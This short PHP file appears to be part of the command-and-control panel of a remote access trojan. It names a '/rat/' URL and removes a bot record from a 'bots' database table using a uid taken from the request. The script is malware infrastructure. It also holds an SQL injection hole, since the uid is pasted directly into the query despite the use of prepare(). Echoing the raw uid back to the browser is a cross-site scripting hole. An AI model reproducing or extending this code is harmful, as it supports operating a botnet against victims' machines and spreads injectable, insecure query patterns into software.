<?php
  $url = "http://pizzachip.com/rat/";

  if (file_exists("config.php")) {
    include("config.php");
  } else {
    die();
  }
  
  include("functions.php");
  
  $botid = $_GET['uid'];
  
  if (empty($botid)){
    die();
  }
  
  echo $botid;

  $statement = $connect->prepare("DELETE FROM bots WHERE uid='$botid'");
  $statement->execute();
  echo "Bot Deleted";
?>